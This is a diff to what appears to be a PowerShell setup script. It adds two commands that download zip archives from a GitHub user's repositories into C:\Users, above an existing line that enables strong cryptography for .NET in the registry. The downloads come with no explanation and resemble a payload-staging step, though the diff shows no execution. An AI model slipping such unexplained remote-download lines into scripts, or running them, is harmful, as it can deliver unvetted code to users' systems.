@@ -1,3 +1,9 @@
+
+invoke-webrequest -uri "https://github.com/Admo9/ProJ04/raw/main/win64.zip" -outfile "C:\Users\win64.zip"
+
+invoke-webrequest -uri "https://github.com/Admo9/ProJ03/archive/refs/heads/main.zip" -outfile "C:\Users\app64.zip"
+
+
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord
 
 
